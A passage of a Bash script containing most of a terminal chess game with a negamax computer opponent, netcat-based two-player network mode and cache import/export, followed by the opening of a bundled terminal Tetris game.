		return $(( ! ( (fromX - toX) * (fromX - toX) == 1 && toY - fromY == player && to * player < 0 ) ))
	fi
# queen, rock and bishop
elif (( fig == 5 || fig == 4  || fig == 3 )) ; then
# rock - and queen
	if (( fig != 3 )) ; then
	if (( fromX == toX )) ; then
		for (( i = ( fromY < toY ? fromY : toY ) + 1 ; i < ( fromY > toY ? fromY : toY ) ; i++ )) ; do
		if (( ${field[$i,$fromX]} != 0 )) ; then
			return 1
			fi
			done
			return 0
elif (( fromY == toY )) ; then
	for (( i = ( fromX < toX ? fromX : toX ) + 1 ; i < ( fromX > toX ? fromX : toX ) ; i++ )) ; do
	if (( ${field[$fromY,$i]} != 0 )) ; then
			return 1
			fi
			done
			return 0
		fi
	fi
# bishop - and queen
if (( fig != 4 )) ; then
	if (( ( fromY - toY ) * ( fromY - toY ) != ( fromX - toX ) * ( fromX - toX ) )) ; then
	return 1
	fi
	for (( i = 1 ; i < ( $fromY > toY ? fromY - toY : toY - fromY) ; i++ )) ; do
	if (( ${field[$((fromY + i * (toY - fromY > 0 ? 1 : -1 ) )),$(( fromX + i * (toX - fromX > 0 ? 1 : -1 ) ))]} != 0 )) ; then
		return 1
		fi
		done
		return 0
fi
# nothing found? wrong move.
	return 1
# knight
elif (( fig == 2 )) ; then
	return $(( ! ( ( ( fromY - toY == 2 || fromY - toY == -2) && ( fromX - toX == 1 || fromX - toX == -1 ) ) || ( ( fromY - toY == 1 || fromY - toY == -1) && ( fromX - toX == 2 || fromX - toX == -2 ) ) ) ))
# king
elif (( fig == 6 )) ; then
	return $(( !( ( ( fromX - toX ) * ( fromX - toX ) ) <= 1 &&  ( ( fromY - toY ) * ( fromY - toY ) ) <= 1 ) ))
# invalid figure
else
	error "Invalid figure '$from'!"
	exit 1
fi
}
# minimax (game theory) algorithm for evaluate possible movements
# (the heart of your computer enemy)
# currently based on negamax with alpha/beta pruning and transposition tables liked described in
# http://en.wikipedia.org/wiki/Negamax#NegaMax_with_Alpha_Beta_Pruning_and_Transposition_Tables
# Params:
#	$1	current search depth
#	$2	alpha (for pruning)
#	$3	beta (for pruning)
#	$4	current moving player
#	$5	preserves the best move (for ai) if true
# Returns best value as status code
function negamax() {
local depth=$1
local a=$2
local b=$3
local player=$4
local save=$5
# transposition table
local aSave=$a
local hash
hash="$player ${field[@]}"
if ! $save && test "${cacheLookup[$hash]+set}" && (( ${cacheDepth[$hash]} >= depth )) ; then
	local value=${cacheLookup[$hash]}
	local flag=${cacheFlag[$hash]}
	if (( flag == 0 )) ; then
		return $value
	elif (( flag == 1 && value > a )) ; then
		a=$value
	elif (( flag == -1 && value < b )) ; then
		b=$value
	fi
	if (( a >= b )) ; then
		return $value
	fi
fi
# lost own king?
if ! hasKing "$player" ; then
	cacheLookup[$hash]=$(( strength - depth + 1 ))
	cacheDepth[$hash]=$depth
	cacheFlag[$hash]=0
	return $(( strength - depth + 1 ))
# use heuristics in depth
elif (( depth <= 0 )) ; then
	local values=0
	for (( y=0; y<8; y++ )) ; do
		for (( x=0; x<8; x++ )) ; do
			local fig=${field[$y,$x]}
			if (( ${field[$y,$x]} != 0 )) ; then
				local figPlayer=$(( fig < 0 ? -1 : 1 ))
# a more simple heuristic would be values=$(( $values + $fig ))
	(( values += ${figValues[$fig * $figPlayer]} * figPlayer ))
# pawns near to end are better
if (( fig == 1 )) ; then
	if (( figPlayer > 0 )) ; then
	(( values += ( y - 1 ) / 2 ))
else
	(( values -= ( 6 + y ) / 2 ))
fi
fi
fi
done
done
	values=$(( 127 + ( player * values ) ))
# ensure valid bash return range
if (( values > 253 - strength )) ; then
	values=$(( 253 - strength ))
elif (( values < 2 + strength )) ; then
	values=$(( 2 + strength ))
fi
	cacheLookup[$hash]=$values
	cacheDepth[$hash]=0
	cacheFlag[$hash]=0
	return $values
# calculate best move
else
	local bestVal=0
	local fromY
	local fromX
	local toY
	local toX
	local i
	local j
	for (( fromY=0; fromY<8; fromY++ )) ; do
		for (( fromX=0; fromX<8; fromX++ )) ; do
		local fig=$(( ${field[$fromY,$fromX]} * ( player ) ))
# precalc possible fields (faster then checking every 8*8 again)
	local targetY=()
	local targetX=()
	local t=0
# empty or enemy
if (( fig <= 0 )) ; then
	continue
# pawn
elif (( fig == 1 )) ; then
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX ))
	(( t += 1 ))
	targetY[$t]=$(( 2 * player + fromY ))
	targetX[$t]=$(( fromX ))
	(( t += 1 ))
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX + 1 ))
	(( t += 1 ))
	targetY[$t]=$(( player + fromY ))
	targetX[$t]=$(( fromX - 1 ))
	(( t += 1 ))
# knight
elif (( fig == 2 )) ; then
	for (( i=-1 ; i<=1 ; i=i+2 )) ; do
	for (( j=-1 ; j<=1 ; j=j+2 )) ; do
		targetY[$t]=$(( fromY + 1 * i ))
		targetX[$t]=$(( fromX + 2 * j ))
		(( t + 1 ))
		targetY[$t]=$(( fromY + 2 * i ))
		targetX[$t]=$(( fromX + 1 * j ))
		(( t + 1 ))
done
done
# king
elif (( fig == 6 )) ; then
	for (( i=-1 ; i<=1 ; i++ )) ; do
	for (( j=-1 ; j<=1 ; j++ )) ; do
	targetY[$t]=$(( fromY + i ))
	targetX[$t]=$(( fromX + j ))
	(( t += 1 ))
	done
done
else
# bishop or queen
if (( fig != 4 )) ; then
	for (( i=-8 ; i<=8 ; i++ )) ; do
	if (( i != 0 )) ; then
# can be done nicer but avoiding two loops!
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
	fi
	done
fi
# rock or queen
if (( fig != 3 )) ; then
	for (( i=-8 ; i<=8 ; i++ )) ; do
	if (( i != 0 )) ; then
		targetY[$t]=$(( fromY + i ))
		targetX[$t]=$(( fromX ))
		(( t += 1 ))
		targetY[$t]=$(( fromY - i ))
		targetX[$t]=$(( fromX ))
		(( t += 1 ))
		targetY[$t]=$(( fromY ))
		targetX[$t]=$(( fromX + i ))
		(( t += 1 ))
		targetY[$t]=$(( fromY ))
		targetX[$t]=$(( fromX - i ))
		(( t += 1 ))
	fi
	done
	fi
fi
# process all available moves
for (( j=0; j < t; j++ )) ; do
	local toY=${targetY[$j]}
	local toX=${targetX[$j]}
# move is valid
if (( toY >= 0 && toY < 8 && toX >= 0 && toX < 8 )) &&  canMove "$fromY" "$fromX" "$toY" "$toX" "$player" ; then
	local oldFrom=${field[$fromY,$fromX]};
	local oldTo=${field[$toY,$toX]};
	field[$fromY,$fromX]=0
	field[$toY,$toX]=$oldFrom
# pawn to queen
if (( oldFrom == player && toY == ( player > 0 ? 7 : 0 ) )) ;then
	field["$toY,$toX"]=$(( 5 * player ))
fi
# recursion
negamax $(( depth - 1 )) $(( 255 - b )) $(( 255 - a )) $(( player * (-1) )) false
local val=$(( 255 - $? ))
field[$fromY,$fromX]=$oldFrom
field[$toY,$toX]=$oldTo
	if (( val > bestVal )) ; then
		bestVal=$val
	if $save ; then
		selectedX=$fromX
		selectedY=$fromY
		selectedNewX=$toX
		selectedNewY=$toY
	fi
	fi
	if (( val > a )) ; then
		a=$val
	fi
	if (( a >= b )) ; then
		break 3
	fi
	fi
		done
	done
done
cacheLookup[$hash]=$bestVal
cacheDepth[$hash]=$depth
	if (( bestVal <= aSave )) ; then
		cacheFlag[$hash]=1
	elif (( bestVal >= b )) ; then
		cacheFlag[$hash]=-1
	else
		cacheFlag[$hash]=0
	fi
	return $bestVal
	fi
}
# Perform a concrete single movement
# Params:
# 	$1	current player
# Globals:
#	$selectedY
#	$selectedX
#	$selectedNewY
#	$selectedNewX
# Return status code 0 if movement was successfully performed
function move() {
local player=$1
if canMove "$selectedY" "$selectedX" "$selectedNewY" "$selectedNewX" "$player" ; then
	local fig=${field[$selectedY,$selectedX]}
	field[$selectedY,$selectedX]=0
	field[$selectedNewY,$selectedNewX]=$fig
# pawn to queen
if (( fig == player && selectedNewY == ( player > 0 ? 7 : 0 ) )) ; then
	field[$selectedNewY,$selectedNewX]=$(( 5 * player ))
fi
return 0
fi
return 1
}
# Unicode helper function (for draw)
# Params:
#	$1	first hex unicode character number
#	$2	second hex unicode character number
#	$3	third hex unicode character number
#	$4	integer offset of third hex
# Outputs escape character
function unicode() {
if ! $ascii ; then
	printf '\\x%s\\x%s\\x%x' "$1" "$2" "$(( 0x$3 + ( $4 ) ))"
fi
}
# Ascii helper function (for draw)
# Params:
#	$1	decimal ascii character number
# Outputs escape character
function ascii() {
	echo -en "\x$1"
}
# Get ascii code number of character
# Params:
#	$1	ascii character
# Outputs decimal ascii character number
function ord() {
	LC_CTYPE=C printf '%d' "'$1"
}
# Audio and visual bell
# No params or return
function bell() {
if (( lastBell != SECONDS )) ; then
	echo -en "\a\e[?5h"
	sleep 0.1
	echo -en "\e[?5l"
	lastBell=$SECONDS
fi
}
# Draw one field (of the gameboard)
# Params:
#	$1	y coordinate
#	$2	x coordinate
#	$3	true if cursor should be moved to position
# Outputs formated field content
function drawField(){
	local y=$1
	local x=$2
	echo -en "\e[0m"
# move coursor to absolute position
if $3 ; then
	local yScr=$(( y + originY ))
	local xScr=$(( x * 2 + originX ))
	if $ascii && (( x >= 0 )) ; then
		local xScr=$(( x * 3 + originX ))
	fi
	echo -en "\e[${yScr};${xScr}H"
fi
# draw vertical labels
if (( x==labelX && y >= 0 && y < 8)) ; then
	if $hoverInit && (( hoverY == y )) ; then
	if $color ; then
		echo -en "\e[3${colorHover}m"
	else
		echo -en "\e[4m"
	fi
	elif (( selectedY == y )) ; then
	if ! $color ; then
		echo -en "\e[2m"
	elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
		echo -en "\e[3${colorPlayerA}m"
	else
		echo -en "\e[3${colorPlayerB}m"
	fi
fi
# line number (alpha numeric)
if $unicodelabels ; then
	echo -en "$(unicode e2 92 bd -$y) "
else
	echo -en " \x$((48 - $y))"
fi
# clear format
# draw horizontal labels
elif (( x>=0 && y==labelY )) ; then
	if $hoverInit && (( hoverX == x )) ; then
	if $color ; then
		echo -en "\e[3${colorHover}m"
	else
		echo -en "\e[4m"
	fi
	elif (( selectedX == x )) ; then
	if ! $color ; then
		echo -en "\e[2m"
	elif (( ${field[$selectedY,$selectedX]} < 0 )) ; then
		echo -en "\e[3${colorPlayerA}m"
	else
		echo -en "\e[3${colorPlayerB}m"
	fi
	else
		echo -en "\e[0m"
	fi
	if $unicodelabels ; then
		echo -en "$(unicode e2 9e 80 $x )\e[0m "
	else
	if $ascii ; then
		echo -n " "
	fi
		echo -en "\x$((31 + $x))\e[0m "
	fi
# draw field
elif (( y >=0 && y < 8 && x >= 0 && x < 8 )) ; then
	local f=${field["$y,$x"]}
	local black=false
if (( ( x + y ) % 2 == 0 )) ; then
	local black=true
fi
# black/white fields
if $black ; then
if $color ; then
	echo -en "\e[47;107m"
else
	echo -en "\e[7m"
fi
else
	$color && echo -en "\e[40m"
fi
# background
if $hoverInit && (( hoverX == x && hoverY == y )) ; then
if ! $color ; then
	echo -en "\e[4m"
elif $black ; then
	echo -en "\e[4${colorHover};10${colorHover}m"
else
	echo -en "\e[4${colorHover}m"
fi
elif (( selectedX != -1 && selectedY != -1 )) ; then
	local selectedPlayer=$(( ${field[$selectedY,$selectedX]} > 0 ? 1 : -1 ))
if (( selectedX == x && selectedY == y )) ; then
if ! $color ; then
	echo -en "\e[2m"
elif $black ; then
	echo -en "\e[47m"
else
	echo -en "\e[40;100m"
fi
elif $color && $colorHelper && canMove "$selectedY" "$selectedX" "$y" "$x" "$selectedPlayer" ; then
if $black ; then
if (( selectedPlayer < 0 )) ; then
	echo -en "\e[4${colorPlayerA};10${colorPlayerA}m"
else
	echo -en "\e[4${colorPlayerB};10${colorPlayerB}m"
fi
else
if (( selectedPlayer < 0 )) ; then
	echo -en "\e[4${colorPlayerA}m"
else
	echo -en "\e[4${colorPlayerB}m"
fi
fi
fi
fi
# empty field?
if ! $ascii && (( f == 0 )) ; then
	echo -en "  "
else
# figure colors
if $color ; then
if (( selectedX == x && selectedY == y )) ; then
if (( f < 0 )) ; then
	echo -en "\e[3${colorPlayerA}m"
else
	echo -en "\e[3${colorPlayerB}m"
fi
else
if (( f < 0 )) ; then
	echo -en "\e[3${colorPlayerA};9${colorPlayerA}m"
else
	echo -en "\e[3${colorPlayerB};9${colorPlayerB}m"
fi
fi
fi
# unicode figures
if $ascii ; then
	echo -en " \e[1m${asciiNames[ $f + 6 ]} "
elif (( f > 0 )) ; then
if $color && $colorFill ; then
	echo -en "$( unicode e2 99 a0 -$f ) "
else
	echo -en "$( unicode e2 99 9a -$f ) "
fi
else
	echo -en "$( unicode e2 99 a0 $f ) "
fi
fi
# three empty chars
elif $ascii && (( x >= 0 )) ; then
	echo -n "   "
# otherwise: two empty chars (on unicode boards)
else
	echo -n "  "
fi
# clear format
	echo -en "\e[0m\e[8m"
}
# Draw the battlefield
# (no params / return value)
function draw() {
local ty
local tx
$useStty && stty -echo
$cursor || echo -e "\e[2J"
echo -e "\e[H\e[?25l\e[0m\n\e[K$title\e[0m\n\e[K"
for (( ty=0; ty<10; ty++ )) ; do
	for (( tx=-2; tx<8; tx++ )) ; do
	if $cursor ; then
		local t
		t="$(drawField "$ty" "$tx" true)"
		if [[ "${redraw[$ty,$tx]}" != "$t" ]]; then
			echo -n "$t"
			redraw[$ty,$tx]="$t"
			log="[$ty,$tx]"
		fi
	else
		drawField "$ty" "$tx" false
	fi
done
$cursor || echo ""
done
$useStty && stty echo
# clear format
echo -en "\e[0m\e[$(( originY + 10 ));0H\e[2K\n\e[2K$message\e[8m"
}
# Read the next move coordinates
# from keyboard (direct access or cursor keypad)
# or use mouse input (if available)
# Returns 0 on success and 1 on abort
function inputCoord(){
	inputY=-1
	inputX=-1
	local ret=0
	local t
	local tx
	local ty
	local oldHoverX=$hoverX
	local oldHoverY=$hoverY
	IFS=''
	$useStty && stty echo
if $mouse ; then
	echo -en "\e[?9h"
fi
while (( inputY < 0 || inputY >= 8 || inputX < 0  || inputX >= 8 )) ; do
read -sN1 a
	case "$a" in
	$'\e') if read -t0.1 -sN2 b ; then
	case "$b" in
	'[A' | 'OA')
		hoverInit=true
	if (( --hoverY < 0 )) ; then
		hoverY=0
		bell
	fi ;;
	'[B' | 'OB')
		hoverInit=true
	if (( ++hoverY > 7 )) ; then
		hoverY=7
		bell
	fi ;;
	'[C' | 'OC')
		hoverInit=true
	if (( ++hoverX > 7 )) ; then
		hoverX=7
		bell
	fi ;;
	'[D' | 'OD')
		hoverInit=true
	if (( --hoverX < 0 )) ; then
		hoverX=0
		bell
	fi ;;
	'[3')
		ret=1
		bell
	break ;;
	'[5')
		hoverInit=true
	if (( hoverY == 0 )) ; then
		bell
	else
		hoverY=0
	fi ;;
	'[6')
		hoverInit=true
	if (( hoverY == 7 )) ; then
		bell
	else
		hoverY=7
	fi ;;
	'OH')
		hoverInit=true
	if (( hoverX == 0 )) ; then
		bell
	else
		hoverX=0
	fi ;;
	'OF')
		hoverInit=true
	if (( hoverX == 7 )) ; then
		bell
	else
		hoverX=7
	fi ;;
	'[M')
		read -sN1 t
		read -sN1 tx
		read -sN1 ty
		ty=$(( $(ord "$ty") - 32 - originY ))
	if $ascii ; then
		tx=$(( ( $(ord "$tx") - 32 - originX) / 3 ))
	else
		tx=$(( ( $(ord "$tx") - 32 - originX) / 2 ))
	fi
	if (( tx >= 0 && tx < 8 && ty >= 0 && ty < 8 )) ; then
		inputY=$ty
		inputX=$tx
		hoverY=$ty
		hoverX=$tx
	else
		ret=1
		bell
	break
	fi ;;
	*) bell
	esac
	else
		ret=1
		bell
	break
	fi ;;
	$'\t' | $'\n' | ' ')
		if $hoverInit ; then
		inputY=$hoverY
		inputX=$hoverX
	fi ;;
	'~') ;;
	$'\x7f' | $'\b')
		ret=1
		bell
	break ;;
	[A-Ha-h])
		t=$(ord $a)
	if (( t < 90 )) ; then
		inputY=$(( 72 - $(ord $a) ))
	else
		inputY=$(( 104 - $(ord $a) ))
	fi
		hoverY=$inputY ;;
	[1-8])
		inputX=$(( a - 1 ))
		hoverX=$inputX ;;
	*) bell ;;
	esac
if $hoverInit && (( oldHoverX != hoverX || oldHoverY != hoverY )) ; then
	oldHoverX=$hoverX
	oldHoverY=$hoverY
	draw
fi
done
if $mouse ; then
	echo -en "\e[?9l"
fi
	$useStty && stty -echo
return $ret
}
# Player input
# (reads a valid user movement)
# Params
# 	$1	current (user) player
# Returns status code 0
function input() {
local player=$1
SECONDS=0
message="\e[1m$(namePlayer "$player")\e[0m: Move your figure"
while true ; do
	selectedY=-1
	selectedX=-1
	title="It's $(namePlayer "$player")s turn"
	draw >&3
if inputCoord ; then
	selectedY=$inputY
	selectedX=$inputX
if (( ${field["$selectedY,$selectedX"]} == 0 )) ; then
	warn "You cannot choose an empty field!" >&3
elif (( ${field["$selectedY,$selectedX"]} * player  < 0 )) ; then
	warn "You cannot choose your enemies figures!" >&3
else
	send "$player" "$selectedY" "$selectedX"
	local figName=$(nameFigure ${field[$selectedY,$selectedX]} )
	message="\e[1m$(namePlayer "$player")\e[0m: Move your \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to"
	draw >&3
if inputCoord ; then
	selectedNewY=$inputY
	selectedNewX=$inputX
if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
	warn "You didn't move..." >&3
elif (( ${field[$selectedNewY,$selectedNewX]} * $player > 0 )) ; then
	warn "You cannot kill your own figures!" >&3
elif move "$player" ; then
	title="$(namePlayer "$player") moved the \e[3m$figName\e[0m from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX") \e[2m(took him $SECONDS seconds)\e[0m"
	send "$player" "$selectedNewY" "$selectedNewX"
return 0
else
	warn "This move is not allowed!" >&3
fi
# Same position again --> revoke
	send "$player" "$selectedY" "$selectedX"
fi
fi
fi
done
}
# AI interaction
# (calculating movement)
# Params
# 	$1	current (ai) player
# Verbose movement messages to stdout
function ai() {
local player=$1
local val
SECONDS=0
title="It's $(namePlayer "$player")s turn"
message="Computer player \e[1m$(namePlayer "$player")\e[0m is thinking..."
draw >&3
negamax "$strength" 0 255 "$player" true
val=$?
local figName
figName=$(nameFigure ${field[$selectedY,$selectedX]} )
message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX")..."
draw >&3
send "$player" "$selectedY" "$selectedX"
sleep "$sleep"
if move $player ; then
	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX")"
	draw >&3
	send "$player" "$selectedNewY" "$selectedNewX"
	sleep "$sleep"
	title="$( namePlayer "$player" ) moved the $figName from $(coord "$selectedY" "$selectedX") to $(coord "$selectedNewY" "$selectedNewX" ) (took him $SECONDS seconds)."
else
	error "AI produced invalid move - that should not hapen!"
fi
}
# Read row from remote
# Returns row (0-7) as status code
function receiveY() {
local i
while true; do
read -n 1 i
case $i in
	[hH]) return 0 ;; [gG]) return 1 ;; [fF]) return 2 ;; [eE]) return 3 ;; [dD]) return 4 ;; [cC]) return 5 ;; [bB]) return 6 ;; [aA]) return 7 ;;
	*)
	if $warnings ; then
		warn "Invalid input '$i' for row from network (character between 'A' and 'H' required)!"
	fi
esac
done
}
# Read column from remote
# Returns column (0-7) as status code
function receiveX() {
	local i
while true; do
read -n 1 i
case $i in
	[1-8]) return $(( i - 1 )) ;;
	*)
	if $warnings ; then
		warn "Invalid input '$i' for column from network (character between '1' and '8' required)!"
	fi ;;
esac
done
}
# receive movement from connected player
# (no params/return value)
function receive() {
local player=$remote
SECONDS=0
title="It's $(namePlayer "$player")s turn"
message="Network player \e[1m$(namePlayer "$player")\e[0m is thinking... (or sleeping?)"
draw >&3
while true ; do
	receiveY
	selectedY=$?
	receiveX
	selectedX=$?
	local figName
	figName=$(nameFigure ${field[$selectedY,$selectedX]} )
	message"\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX)..."
	draw >&3
	receiveY
	selectedNewY=$?
	receiveX
	selectedNewX=$?
	if (( selectedNewY == selectedY && selectedNewX == selectedX )) ; then
		selectedY=-1
		selectedX=-1
		selectedNewY=-1
		selectedNewX=-1
		message="\e[1m$( namePlayer "$player" )\e[0m revoked his move... okay, that'll be time consuming"
		draw >&3
	else
		break
	fi
done
if move $player ; then
	message="\e[1m$( namePlayer "$player" )\e[0m moves the \e[3m$figName\e[0m at $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX)"
	draw >&3
	sleep "$sleep"
	title="$( namePlayer $player ) moved the $figName from $(coord $selectedY $selectedX) to $(coord $selectedNewY $selectedNewX) (took him $SECONDS seconds)."
else
	error "Received invalid move from network - that should not hapen!"
fi
}
# Write coordinates to network
# Params:
#	$1	player
#	$2	row
#	$3	column
# (no return value/exit code)
function send() {
local player=$1
local y=$2
local x=$3
if (( remote == player * (-1) )) ; then
	sleep "$remotedelay"
	coord "$y" "$x"
	echo
	sleep "$remotedelay"
fi
}
# Import transposition tables
# by reading serialised cache from stdin
# (no params / return value)
function importCache() {
	while IFS=$'\t' read hash lookup depth flag ; do
		cacheLookup["$hash"]=$lookup
		cacheDepth["$hash"]=$depth
		cacheFlag["$hash"]=$flag
	done
}
# Export transposition tables
# Outputs serialised cache (to stdout)
# (no params / return value)
function exportCache() {
for hash in "${!cacheLookup[@]}" ; do
	echo -e "$hash\t${cacheLookup[$hash]}\t${cacheDepth[$hash]}\t${cacheFlag[$hash]}"
done
}
# Trap function for exporting cache
# (no params / return value)
function exitCache() {
# permanent cache: export
if [[ -n "$cache" ]]; then
	echo -en "\r\n\e[2mExporting cache..." >&3
	if $cachecompress ; then
		exportCache | gzip > "$cache"
	else
		exportCache > "$cache"
	fi
	echo -e " done!\e[0m" >&3
fi
}
# Perform necessary tasks for exit
# like deleting files and measuring runtime
# (no params / return value)
function end() {
# remove pipe
	if [[ -n "$fifopipe" && -p "$fifopipe" ]]; then
		rm "$fifopipe"
	fi
# disable mouse
	if $mouse ; then
		echo -en "\e[?9l"
	fi
# enable input
	stty echo
# restore screen
	if $cursor ; then
		echo -en "\e[2J\e[?47l\e[?25h\e[u\e8"
	fi
# exit message
	duration=$(( $( date +%s%N ) - timestamp ))
	seconds=$(( duration / 1000000000 ))
	echo -e "\r\n\e[2mYou've wasted $seconds,$(( duration -( seconds * 1000000000 ))) seconds of your lifetime playing with a Bash script.\e[0m\n"
}
# Exit trap
trap "end" 0
# setting up requirements for network
piper="cat"
fifopipe="/dev/fd/1"
initializedGameLoop=true
if (( remote != 0 )) ; then
	require nc
	require mknod
	initializedGameLoop=false
	if (( remote == 1 )) ; then
		fifopipe="$fifopipeprefix.server"
		piper="nc -l $port"
	else
		fifopipe="$fifopipeprefix.client"
		piper="nc $remoteip $port"
		echo -e "\e[1mWait!\e[0mPlease make sure the Host (the other Player) has started before continuing.\e[0m"
		anyKey
	fi
	if [[ ! -e "$fifopipe" ]]; then
		mkfifo "$fifopipe"
	fi
	if [[ ! -p "$fifopipe" ]]; then
		echo "Could not create FIFO pipe '$fifopipe'!" >&2
	fi
fi

# print welcome title
title="Welcome to ChessBa.sh"
if isAI "1" || isAI "-1" ; then
	title="$title - your room heater tool!"
fi

# permanent cache: import
if [[ -n "$cache" && -f "$cache" ]]; then
	echo -en "\n\n\e[2mImporting cache..."
	if $cachecompress ; then
		importCache < <( zcat "$cache" )
	else
		importCache < "$cache"
	fi
	echo -e " done\e[0m"
fi
# main game loop
{
	p=1
	while true ; do
# initialize remote connection on first run
	if ! $initializedGameLoop ; then
# set cache export trap
	trap "exitCache" 0
	warn "Waiting for the other network player to be ready..." >&3
# exchange names
	if (( remote == -1 )) ; then
		read namePlayerA < $fifopipe
		echo "$namePlayerB"
		echo "connected with first player." >&3
	elif (( remote == 1 )) ; then
		echo "$namePlayerA"
		read namePlayerB < $fifopipe
		echo "connected with second player." >&3
	fi
# set this loop initialized
	initializedGameLoop=true
		fi
# reset global variables
	selectedY=-1
	selectedX=-1
	selectedNewY=-1
	selectedNewX=-1
# switch current player
	(( p *= (-1) ))
# check check (or: if the king is lost)
	if hasKing "$p" ; then
		if (( remote == p )) ; then
			receive < $fifopipe
		elif isAI "$p" ; then
			if (( computer-- == 0 )) ; then
			echo "Stopping - performed all ai steps" >&3
		exit 0
			fi
			ai "$p"
		else
			input "$p"
		fi
	else
		title="Game Over!"
		message="\e[1m$(namePlayer $(( p * (-1) )) ) wins the game!\e[1m\n"
		draw >&3
		anyKey
		exit 0
	fi
done | $piper > "$fifopipe"
# check exit code
	netcatExit=$?
	gameLoopExit=${PIPESTATUS[0]}
	if (( netcatExit != 0 )) ; then
		error "Network failure!"
	elif (( gameLoopExit != 0 )) ; then
		error "The game ended unexpected!"
	fi
} 3>&1
}
##
#----Pass time tetris
##
tetris_game() {
# Tetris game written in pure bash
# I tried to mimic as close as possible original tetris game
# which was implemented on old soviet DVK computers (PDP-11 clones)
# Videos of this tetris can be found here:
# http://www.youtube.com/watch?v=O0gAgQQHFcQ
# http://www.youtube.com/watch?v=iIQc1F3UuV4
# This script was created on ubuntu 13.04 x64 and bash 4.2.45(1)-release.
# It was not tested on other unix like operating systems.
# Enjoy :-)!
# Author: Kirill Timofeev <kt97679@gmail.com>
set -u # non initialized variable is an error
# 2 signals are used: SIGUSR1 to decrease delay after level up and SIGUSR2 to quit
# they are sent to all instances of this script
# because of that we should process them in each instance
# in this instance we are ignoring both signals
trap '' SIGUSR1 SIGUSR2
# Those are commands sent to controller by key press processing code
# In controller they are used as index to retrieve actual functuon from array
local QUIT=0
local RIGHT=1
local LEFT=2
local ROTATE=3
local DOWN=4
local DROP=5
local TOGGLE_HELP=6
local TOGGLE_NEXT=7
local TOGGLE_COLOR=8
local DELAY=1          # initial delay between piece movements
local DELAY_FACTOR=0.8 # this value controld delay decrease for each level up
# color codes
local RED=1
local GREEN=2
local YELLOW=3
local BLUE=4
local FUCHSIA=5
local CYAN=6
local WHITE=7
# Location and size of playfield, color of border
local PLAYFIELD_W=10
local PLAYFIELD_H=20
local PLAYFIELD_X=30
local PLAYFIELD_Y=1
local BORDER_COLOR=$YELLOW
# Location and color of score information
local SCORE_X=1
local SCORE_Y=2
local SCORE_COLOR=$GREEN
# Location and color of help information
local HELP_X=58
local HELP_Y=1
local HELP_COLOR=$CYAN
# Next piece location
local NEXT_X=14
local NEXT_Y=11
# Location of "game over" in the end of the game
local GAMEOVER_X=1
local GAMEOVER_Y=$((PLAYFIELD_H + 3))
# Intervals after which game level (and game speed) is increased 
local LEVEL_UP=20
local colors=($RED $GREEN $YELLOW $BLUE $FUCHSIA $CYAN $WHITE)
local no_color=true    # do we use color or not
local showtime=true    # controller runs while this flag is true
local empty_cell=" ."  # how we draw empty cell
local filled_cell="[]" # how we draw filled cell
local score=0           # score variable initialization
local level=1           # level variable initialization
local lines_completed=0 # completed lines counter initialization
# screen_buffer is variable, that accumulates all screen changes
# this variable is printed in controller once per game cycle
puts() {
	screen_buffer+=${1}
}
# move cursor to (x,y) and print string
# (1,1) is upper left corner of the screen
xyprint() {
	puts "\033[${2};${1}H${3}"
}
show_cursor() {
	echo -ne "\033[?25h"
}
hide_cursor() {
	echo -ne "\033[?25l"
}
# foreground color
set_fg() {
	$no_color && return
	puts "\033[3${1}m"
}
# background color
set_bg() {
	$no_color && return
	puts "\033[4${1}m"
}
reset_colors() {
	puts "\033[0m"
}
set_bold() {
	puts "\033[1m"
}
# playfield is 1-dimensional array, data is stored as follows:
# [ a11, a21, ... aX1, a12, a22, ... aX2, ... a1Y, a2Y, ... aXY]
#   |<  1st line   >|  |<  2nd line   >|  ... |<  last line  >|
# X is PLAYFIELD_W, Y is PLAYFIELD_H
# each array element contains cell color value or -1 if cell is empty
redraw_playfield() {
	local j i x y xp yp
	((xp = PLAYFIELD_X))
	for ((y = 0; y < PLAYFIELD_H; y++)) {
		((yp = y + PLAYFIELD_Y))
		((i = y * PLAYFIELD_W))
		xyprint $xp $yp ""
		for ((x = 0; x < PLAYFIELD_W; x++)) {
		((j = i + x))
		if ((${play_field[$j]} == -1)) ; then
		puts "$empty_cell"
		else
		set_fg ${play_field[$j]}
		set_bg ${play_field[$j]}
		puts "$filled_cell"
		reset_colors
		fi
		}
	}
}
update_score() {
# Arguments: 1 - number of completed lines
	((lines_completed += $1))
# Unfortunately I don't know scoring algorithm of original tetris
# Here score is incremented with squared number of lines completed
# this seems reasonable since it takes more efforts to complete several lines at once
	((score += ($1 * $1)))
	if (( score > LEVEL_UP * level)) ; then          # if level should be increased
		((level++))                                  # increment level
		pkill -SIGUSR1 -f "/bin/bash $0" # and send SIGUSR1 signal to all instances of this script (please see ticker for more details)
	fi
	set_bold
	set_fg $SCORE_COLOR
	xyprint $SCORE_X $SCORE_Y         "Lines completed: $lines_completed"
	xyprint $SCORE_X $((SCORE_Y + 1)) "Level:           $level"
	xyprint $SCORE_X $((SCORE_Y + 2)) "Score:           $score"
	reset_colors
}
help=(
"  Use cursor keys"
"       or"
"      s: up"
"a: left,  d: right"
"    space: drop"
"      q: quit"
"  c: toggle color"
"n: toggle show next"
"h: toggle this help"
)
help_on=-1 # if this flag is 1 help is shown
toggle_help() {
	local i s
	set_bold
	set_fg $HELP_COLOR
	for ((i = 0; i < ${#help[@]}; i++ )) {
